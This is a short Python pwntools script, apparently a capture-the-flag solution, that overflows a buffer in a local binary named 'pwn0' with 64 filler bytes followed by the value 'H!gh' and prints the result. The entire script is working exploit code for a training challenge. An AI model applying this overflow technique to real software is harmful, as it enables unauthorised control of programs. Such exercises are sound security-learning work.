from pwn import *

filler = 'A' * 64
flag = 'H!gh'

p = process('./pwn0')
p.sendline(filler + flag)
output = p.recvall()

print(output)